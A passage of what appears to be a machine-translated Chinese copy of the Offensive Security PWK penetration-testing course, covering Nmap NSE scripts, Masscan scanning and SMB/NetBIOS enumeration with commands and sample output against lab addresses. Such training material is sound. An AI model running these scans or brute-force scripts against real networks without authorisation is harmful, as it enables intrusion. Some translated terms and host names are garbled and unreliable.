<div style="position:absolute;top:228419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-05-06 11:02 MDT 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:228453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dns 区域传输</font></font></nobr></div>
<div style="position:absolute;top:228470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别：侵入性发现</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:228487;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://nmap.org/nsedoc/scripts/dns-zone-transfer.html</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:228504;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 DNS 服务器请求区域传输 (AXFR)。</font></font></nobr></div>
<div style="position:absolute;top:228537;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该脚本向 DNS 服务器发送 AXFR 查询。</font><font style="vertical-align: inherit;">要查询的域是</font></font></nobr></div>
<div style="position:absolute;top:228555;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过检查命令行上给出的名称确定，DNS</font></font></nobr></div>
<div style="position:absolute;top:228572;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器的主机名，或者可以用</font></font></nobr></div>
<div style="position:absolute;top:228589;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;code&gt;dns-zone-transfer.domain&lt;/code&gt; 脚本参数。</font><font style="vertical-align: inherit;">如果查询是</font></font></nobr></div>
<div style="position:absolute;top:228605;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功返回所有域和域类型以及常见的</font></font></nobr></div>
<div style="position:absolute;top:228622;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">键入特定数据 (SOA/MX/NS/PTR/A)。</font></font></nobr></div>
<div style="position:absolute;top:228639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:228659;left:224"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 246 - 使用 --script-help 选项查看有关脚本的更多信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:228688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在无法访问 Internet 的情况下，也可以在</font></font></nobr></div>
<div style="position:absolute;top:228708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NSE 脚本文件本身。</font></font></nobr></div>
<div style="position:absolute;top:228740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花点时间探索各种 NSE 脚本，因为它们中的许多都非常有用且省时。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:228775;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.2.9 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:228805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Nmap 对目标 IP 范围进行 ping 扫描并将输出保存到文件中。</font><font style="vertical-align: inherit;">用</font></font></nobr></div>
<div style="position:absolute;top:228824;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep 显示联机的机器。</font></font></nobr></div>
<div style="position:absolute;top:228852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 扫描您在练习 1 中找到的 IP 地址以查找开放的网络服务器端口。</font><font style="vertical-align: inherit;">使用 Nmap 查找</font></font></nobr></div>
<div style="position:absolute;top:228872;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络服务器和操作系统版本。</font></font></nobr></div>
<div style="position:absolute;top:228900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用 NSE 脚本扫描实验室中运行 SMB 服务的机器。</font></font></nobr></div>
<div style="position:absolute;top:228928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.使用Wireshark捕获Nmap连接和UDP扫描并将其与Netcat进行比较</font></font></nobr></div>
<div style="position:absolute;top:228948;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口扫描。</font><font style="vertical-align: inherit;">它们是相同的还是不同的？</font></font></nobr></div>
<div style="position:absolute;top:228976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.使用Wireshark捕获Nmap SYN扫描并将其与连接扫描进行比较并识别</font></font></nobr></div>
<div style="position:absolute;top:228996;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们之间的区别。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:229030;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.2.3 马斯坎</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:229068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Masscan </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">207</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以说是最快的端口扫描器；</font><font style="vertical-align: inherit;">它可以在大约6分钟内扫描整个互联网，</font></font></nobr></div>
<div style="position:absolute;top:229087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每秒传输惊人的 1000 万个数据包！</font><font style="vertical-align: inherit;">虽然它最初设计用于扫描</font></font></nobr></div>
<div style="position:absolute;top:229106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">整个互联网，它可以轻松处理A类或B类子网，这是一个更合适的目标范围</font></font></nobr></div>
<div style="position:absolute;top:229126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在渗透测试期间。</font></font></nobr></div>
<div style="position:absolute;top:229159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，Kali 上未安装 Masscan；</font><font style="vertical-align: inherit;">它必须使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt install 安装</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:229194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install masscan</font></font></font></b></nobr></div>
<div style="position:absolute;top:229211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:229228;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将安装以下新软件包：</font></font></nobr></div>
<div style="position:absolute;top:229244;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">马斯坎</font></font></nobr></div>
<div style="position:absolute;top:229261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 升级，1 新安装，0 删除和 1469 未升级。</font></font></nobr></div>
<div style="position:absolute;top:229279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要获得 184 kB 的档案。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:229459;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="194"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 194 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:229492;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:230569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:230569;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:230569;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">194</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:229588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此操作后，将使用 401 kB 的额外磁盘空间。</font></font></nobr></div>
<div style="position:absolute;top:229604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:229624;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 247 - 在 Kali Linux 上安装 masscan</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:229653;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑使用 TCP 端口 80 定位大型内部网络上的所有机器的演示</font></font></nobr></div>
<div style="position:absolute;top:229673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开（使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p80</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项）。</font><font style="vertical-align: inherit;">由于 masscan 实现了自定义 TCP/IP 堆栈，因此需要</font></font></nobr></div>
<div style="position:absolute;top:229692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问原始套接字，因此需要</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:229754;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意：此命令不得在 PWK 内部实验室网络中尝试，因为</font></font></i></nobr></div>
<div style="position:absolute;top:229774;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您将扫描不允许的子网。</font><font style="vertical-align: inherit;">这个例子是为了</font></font></i></nobr></div>
<div style="position:absolute;top:229793;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仅作插图用途！</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:229857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo masscan -p80 10.0.0.0/8</font></font></font></b></nobr></div>
<div style="position:absolute;top:229876;left:234"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 248 - 使用 masscan 查找 A 类子网中的所有 Web 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:229906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要在 PWK 内部实验室网络的 C 类子网上尝试 masscan，我们可以使用以下命令</font></font></nobr></div>
<div style="position:absolute;top:229925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子。</font><font style="vertical-align: inherit;">我们将添加一些额外的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">masscan</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--rate</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定所需的</font></font></nobr></div>
<div style="position:absolute;top:229945;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据包传输速率，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定要使用的原始网络接口，-- </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">router-ip</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定</font></font></nobr></div>
<div style="position:absolute;top:229964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定相应网关的 IP 地址：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:229999;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1</font></font></font></b></nobr></div>
<div style="position:absolute;top:230032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-03-04 17:15:40 GMT 启动 masscan 1.0.3 (http://bit.ly/14GZzcT)</font></font></nobr></div>
<div style="position:absolute;top:230050;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-- 强制选项：-sS -Pn -n --randomize-hosts -v --send-eth</font></font></nobr></div>
<div style="position:absolute;top:230067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 SYN 隐形扫描</font></font></nobr></div>
<div style="position:absolute;top:230084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描 256 台主机 [1 个端口/主机]</font></font></nobr></div>
<div style="position:absolute;top:230101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.14 上发现开放端口 80/tcp    </font></font></nobr></div>
<div style="position:absolute;top:230117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.39 上发现开放端口 80/tcp    </font></font></nobr></div>
<div style="position:absolute;top:230134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.219 上发现开放端口 80/tcp    </font></font></nobr></div>
<div style="position:absolute;top:230151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.227 上发现开放端口 80/tcp    </font></font></nobr></div>
<div style="position:absolute;top:230169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.10 上发现开放端口 80/tcp    </font></font></nobr></div>
<div style="position:absolute;top:230185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.50 上发现开放端口 80/tcp    </font></font></nobr></div>
<div style="position:absolute;top:230202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 10.11.1.234 上发现开放端口 80/tcp</font></font></nobr></div>
<div style="position:absolute;top:230219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:230238;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 249 - 使用带有更高级选项的 masscan</font></font></i></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:230272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3 SMB 枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:230314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器消息块 (SMB) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议</font><font style="vertical-align: inherit;">的安全跟踪记录</font><font style="vertical-align: inherit;">对许多人来说都很糟糕</font></font></nobr></div>
<div style="position:absolute;top:230333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于其复杂的实施和开放的性质。</font><font style="vertical-align: inherit;">来自未经身份验证的 SMB null</font></font></nobr></div>
<div style="position:absolute;top:230353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 2000 和 XP 中的会话，这些年来大量的 SMB 错误和漏洞，</font></font></nobr></div>
<div style="position:absolute;top:230372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMB 已经看到了其公平的行动份额。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">209</font></font></font></nobr></div>
<div style="position:absolute;top:230405;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也就是说，SMB 协议也与 Windows 同步更新和改进</font></font></nobr></div>
<div style="position:absolute;top:230424;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:230499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">208 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Server_Message_Block</font></font></font></nobr></div>
<div style="position:absolute;top:230519;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">209 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mark A. Gamache，2013 年），http://markgamache.blogspot.ca/2013/01/ntlm-challenge-response-is-100-broken.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:230647;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="195"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 195 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:230680;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:231757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:231757;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:231757;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">195</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:230776;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3.1 扫描 NetBIOS 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:230814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetBIOS </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">210</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务侦听 TCP 端口 139 以及几个 UDP 端口。</font><font style="vertical-align: inherit;">应该注意</font></font></nobr></div>
<div style="position:absolute;top:230833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMB（TCP 端口 445）和 NetBIOS 是两个独立的协议。</font><font style="vertical-align: inherit;">NetBIOS 是一个独立的</font></font></nobr></div>
<div style="position:absolute;top:230852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话层协议和服务，允许本地网络上的计算机与</font></font></nobr></div>
<div style="position:absolute;top:230872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">彼此。</font><font style="vertical-align: inherit;">虽然 SMB 的现代实现可以在没有 NetBIOS 的情况下工作，但</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 上的 NetBIOS</font></font></i></nobr></div>
<div style="position:absolute;top:230891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(NBT) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">211</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是向后兼容所必需的，并且通常一起启用。</font><font style="vertical-align: inherit;">为此，该</font></font></nobr></div>
<div style="position:absolute;top:230910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这两种服务的枚举通常是齐头并进的。</font><font style="vertical-align: inherit;">这些可以使用工具进行扫描，例如</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:230930;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，使用类似于以下的语法：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:230965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254</font></font></font></b></nobr></div>
<div style="position:absolute;top:230984;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 250 - 使用 nmap 扫描 NetBIOS 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:231013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还有其他更专业的工具可以专门识别 NetBIOS 信息，例如</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:231033;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nbtscan </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，在以下示例中使用。</font><font style="vertical-align: inherit;">该</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-r</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于指定始发</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:231052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">UDP 端口为 137，用于查询 NetBIOS 名称服务以获取有效的 NetBIOS 名称：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:231087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nbtscan -r 10.11.1.0/24</font></font></font></b></nobr></div>
<div style="position:absolute;top:231104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对来自 10.11.1.0/24 的地址进行 NBT 名称扫描</font></font></nobr></div>
<div style="position:absolute;top:231138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP 地址 NetBIOS 名称服务器用户    </font></font></nobr></div>
<div style="position:absolute;top:231138;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC地址    </font></font></nobr></div>
<div style="position:absolute;top:231155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------------------------------------------------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:231172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5    </font></font></nobr></div>
<div style="position:absolute;top:231172;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">爱丽丝    </font></font></nobr></div>
<div style="position:absolute;top:231172;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;服务器&gt; 爱丽丝    </font></font></nobr></div>
<div style="position:absolute;top:231172;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:50:56:89:35:af</font></font></nobr></div>
<div style="position:absolute;top:231189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.31 拉尔夫    </font></font></nobr></div>
<div style="position:absolute;top:231189;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;服务器&gt; 黑客    </font></font></nobr></div>
<div style="position:absolute;top:231189;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:50:56:89:08:19</font></font></nobr></div>
<div style="position:absolute;top:231206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.24 发薪日    </font></font></nobr></div>
<div style="position:absolute;top:231206;left:384"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;服务器&gt; PAYDAY    </font></font></nobr></div>
<div style="position:absolute;top:231206;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00:00:00:00:00:00</font></font></nobr></div>
<div style="position:absolute;top:231223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:231242;left:262"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 251 - 使用 nbtscan 收集额外的 NetBIOS 信息</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:231273;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.3.2 Nmap SMB NSE 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:231311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 包含许多有用的 NSE 脚本，可用于发现和枚举 SMB 服务。</font></font></nobr></div>
<div style="position:absolute;top:231331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些脚本可以在 /usr/share/nmap/scripts 目录中找到：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:231366;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 /usr/share/nmap/scripts/smb*</font></font></font></b></nobr></div>
<div style="position:absolute;top:231382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb2-capabilities.nse</font></font></nobr></div>
<div style="position:absolute;top:231399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb2-security-mode.nse</font></font></nobr></div>
<div style="position:absolute;top:231416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb2-time.nse</font></font></nobr></div>
<div style="position:absolute;top:231433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb2-vuln-uptime.nse</font></font></nobr></div>
<div style="position:absolute;top:231451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-brute.nse</font></font></nobr></div>
<div style="position:absolute;top:231467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse</font></font></nobr></div>
<div style="position:absolute;top:231484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-enum-domains.nse</font></font></nobr></div>
<div style="position:absolute;top:231501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-enum-groups.nse</font></font></nobr></div>
<div style="position:absolute;top:231518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-enum-processes.nse</font></font></nobr></div>
<div style="position:absolute;top:231535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-enum-sessions.nse</font></font></nobr></div>
<div style="position:absolute;top:231552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-enum-shares.nse</font></font></nobr></div>
<div style="position:absolute;top:231569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/smb-enum-users.nse</font></font></nobr></div>
